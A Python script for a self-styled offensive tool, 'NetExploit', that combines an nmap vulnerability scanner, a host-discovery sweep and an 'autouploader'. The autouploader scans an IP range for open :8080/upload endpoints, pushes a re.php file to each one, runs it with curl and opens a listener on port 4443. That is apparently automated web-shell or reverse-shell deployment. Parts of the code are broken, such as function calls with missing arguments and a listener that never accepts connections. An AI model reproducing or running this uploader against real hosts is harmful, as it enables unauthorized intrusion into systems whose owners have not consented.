#!/usr/bin/python3
import os
import sys
import time
from typing import Collection
import requests
import nmap
import json
import urllib3
import urllib

import base64
import hashlib
import socket
from art import *
from termcolor import colored
sys.path.append('__init__')
import file_creator as file
import get_ip as ad
SEC_PATH = "/usr/bin/"
nm = nmap.PortScanner()

def listen(port):
    try:
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(('', port))
            s.listen(1)
            return s
    except KeyboardInterrupt:
        print(colored("\n[-] Exiting...","red"))
        main()
    except Exception as e:
        print(colored(e, "red"))
        main()

def download_file(url, filename):
    # NOTE the stream=True parameter
    r = requests.get(url, stream=True)
    with open(filename, 'wb') as f:
        for chunk in r.iter_content(chunk_size=1024): 
            if chunk: # filter out keep-alive new chunks
                f.write(chunk)
                #f.flush()
    return filename

def get_file_size(filename):
    return os.stat(filename).st_size

def get_file_md5(filename):
    import hashlib
    hash_md5 = hashlib.md5()
    with open(filename, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()


def upload_file(url, filename):
    files = {'file': open(filename, 'rb')}
    r = requests.post(url, files=files)
    return r.text

def get_file_list(url):
    r = requests.get(url)
    return r.text

def banner():
    print(colored(text2art("NetExploit"), "red"))
    print(colored("[+] Author: Guidenevada", "green"))


def scan_network(ip_range):
    ip_list = []
    for i in range(1, 255):
        ip = ip_range + str(i)
        try:
            socket.inet_aton(ip)
            ip_list.append(ip)
        except socket.error:
            pass
    return ip_list

def uploader():
    
    urllib3.disable_warnings()
    
    target_ip_range = input(colored("[+] Enter target IP range: ", "blue"))
    
    ip_list = scan_network(target_ip_range)
    fast = 0.5
    slow = 3
    speed = input("[*] The slow scan can take 13 minutes and the fast one can take 3 minutes\n[+] Speed (fast/slow): ")
    if speed == "fast":
        timeo = fast
    elif speed == "slow":
        timeo = slow
    else:
        print("[-] Invalid speed")
        main()
    for ip in ip_list:
        try:
            url = "http://" + ip + ":8080/upload"

                
            print(colored("[*] Testing %s" % url, "blue"))
            r = requests.get(url, timeout=timeo)
            if r.status_code == 200:
                path_dir ="report/" + ip
                file.create_dir(path_dir)
                print(colored("[+] %s is vulnerable" % url, "green"))
                filename = "re.php"
                print(colored("[+] File size: %s" % get_file_size(filename), "green"))
                print(colored("[+] File md5: %s" % get_file_md5(filename), "green"))
                upload_file(url, filename)
                print(colored("[+] File %s uploaded" % filename, "green"))
                port = 4443
                print(colored("[+] Listening on port %s" % port, "green"))
                os.system("gnome-terminal --bash -c 'curl "+ url+"/re.php'")
                listener = input(colored("[*] Do you want to start a listener? (in test) [y/n]: ", "blue"))
                if (listener == "y") or (listener == "Y"):
                    listen(port)
                else:
                    pass
                
        except Exception as e:
            print(e)
        
        except KeyboardInterrupt:
            print(colored("[-] User Interrupt", "red"))
            exit(1)
        except:
            print(("[-] Unknown error", 'red'))


def scanner(url):
    url = input(colored("[*] Enter target URL: ", "blue"))
    ip = ad.get(url)
    path_dir =str("report/" + ip)

    if ip == "error":
        print(colored("[-] Invalid URL or host DOWN", "red"))
        main()
    file.create_dir(path_dir)

    print(colored("[+] Target IP: %s" % ip, "green"))
    print(colored("[+] Target URL: %s" % url, "green"))
    print(colored("[*] Scanning ports of %s" % url, "blue"))
    
    for port in [21, 22, 23, 25, 53, 55, 80, 110, 443, 444, 445, 3306, 5555, 8080, 8443, 9090, 9999, 10000, 10001]:
        
        nm.scan(ip, str(port), arguments=" -sC -sV ")
        if nm[ip]['tcp'][port]['state'] == "open":
            print(colored("[+] % i is open" % port, "green"))
    print(colored("[+] Port scanning finished", "green"))
    print(colored("[*] Scanning for vulnerabilities %s" % url, "blue"))
    result = nm.scan(hosts=str(ip), arguments='-A    --script=vuln')
    
    xml = nm.get_nmap_last_output()
    resultcsv = nm.csv()
    #printable = nm.scan('nmap -sV -oX ' + path_dir + '/nmap.xml  --script vuln,safe  ' + ip)
    resultb64 = base64.b64encode(str(result).encode('utf-8'))
    resultb64 = str(resultb64)
    resultb64 = resultb64.replace('b\'', '')
    resultb64 = resultb64.replace("'", '')
    print(colored("[+] Scan completed", "green"))
    clear = json.dumps(result)
    #print(resultb64)
    resjson = str(path_dir + "/nmap.json")
    rescsv = str(path_dir + "/nmap.csv")
    resxml = str(path_dir + "/nmap.xml")
    #open(resjson, 'w').write(result)

    print(colored("[+] scan results :\n " + ip + "\n" ,"green"))
    print('----------------------------------------------------')
#    print(colored(nm[ip].state(), "green"))
#    print(colored(nm[ip].hostname(), "green"))
#    print(colored(nm[ip].all_tcp(), "green"))
#    print(colored(nm[ip].all_udp(), "green"))
#    print(colored(nm[ip].all_protocols(), "green"))
#
#
#    print(colored(nm[ip].all_sctp(), "green"))
#    print(colored(nm.all_hosts(), "green"))
#    print(colored(nm.all_hosts().keys(), "green"))
#    print(colored(nm.all_hosts().values(), "green"))
#    print(colored(nm.all_hosts().items(), "green"))

    print(colored("[+] %s is up" % ip, "green"))
    print(colored("[+] Hostname: %s" % nm[ip].hostname(), "green"))

    
    #print(nm.scaninfo())
    for proto in nm[ip].all_protocols():
        lport = nm[ip][proto].keys()

        for port in lport:
            print(colored('[+] port : %s\tstate : %s' % (port, nm[ip][proto][port]['state']),"green"))
        print(colored("[+] Protocol: %s" % proto, "green"))
        #print(colored("[+] %s" % nm[ip][proto].keys(), "green"))
        #print(colored("[+] %s" % nm[ip][proto].values(), "green"))
        #print(colored("[+] %s" % nm[ip][proto].items(), "green"))

    #print(nm.scanstats())
    #print(nm.command_line())
    #print(nm.all_hosts())
  

    print('----------------------------------------------------')
     
    
    
    
    
    open(rescsv , 'w').write(resultcsv)
    open(resxml , 'w').write(xml)
    print(colored("[+] Nmap scan saved in %s" % path_dir, "green"))
    #print(open(path_dir + '/nmap.csv').read())
    exit()   

def netdiscover():
    print(colored("[!] Netdiscover is in alpha version.", "orange"))
    print(colored("[!] Please, report bugs to issue section.", "orange"))
    ip_range = str(input("[*] Enter IP range: "))
    for i in range (1, 255):
        ip = ip_range + "." + str(i)
        nm.scan(ip, arguments="-sP")
        if nm[ip].has_host():
            print(colored("[+] %s is up" % ip, "green"))
  
def main():
    try:
        #print(colored("[+] NetExploit", "red"))
        #print(colored("[+] Author: Guidenevada", "green"))
        choice = int(input(colored("\n1 -webscan\n2 -autouploader\n3 -netdiscover(alpha version)\n\n[*] Choose an option: ", "blue")))
        if choice == 1:

            scanner()
        if choice == 2:
            uploader()
        if choice == 3:
            netdiscover()
        else:
            print(colored("[-] Invalid option", "red"))
            main()
    except ValueError:
        print(colored("[-] Invalid option", "red"))
        main()
if __name__ == "__main__":
    try:
        #banner()
        #main()
        func = sys.argv[1]
        url = sys.argv[2]
        if str(func) == '1':
            scanner(url)
        if str(func) == '2':
            uploader()
        if str(func) == '3':
            netdiscover()
    except IndexError:
        print(colored("[-] Invalid option", "red"))
        sys.exit()
    except KeyboardInterrupt:
        print(colored("[-] User Interrupt", "red"))
        exit(1)
